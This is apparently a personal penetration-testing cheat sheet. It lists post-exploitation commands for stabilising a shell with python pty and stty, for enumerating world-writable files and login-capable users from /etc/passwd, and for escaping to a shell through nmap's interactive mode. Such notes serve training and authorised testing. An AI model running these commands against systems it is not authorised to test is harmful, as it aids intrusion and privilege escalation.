---
creation date: June 12th 2023
last modified date: June 12th 2023
aliases: []
tags: #㊙️
---

Search Tag: #㊙️  

# [[S1REN Notes]]  

=============================================================================
[ + AND EXPORT PATH ]
python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
stty columns 200 rows 200
=============================================================================
==Once Broken Out - Before PrivEsc Reference - Perform These Commands========
=============================================================================
find / -perm -2 ! -type l -ls 2>/dev/null |sort -r
-----------------------------------------------------------------------------
grep -vE "nologin|false" /etc/passwd
-----------------------------------------------------------------------------
=====Other, Misc=====
-----------------------------------------------------------------------------
nmap --interactive
nmap> !sh
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: June 12th 2023 (08:43 pm) 
Last Modified Date: June 12th 2023 (08:43 pm)
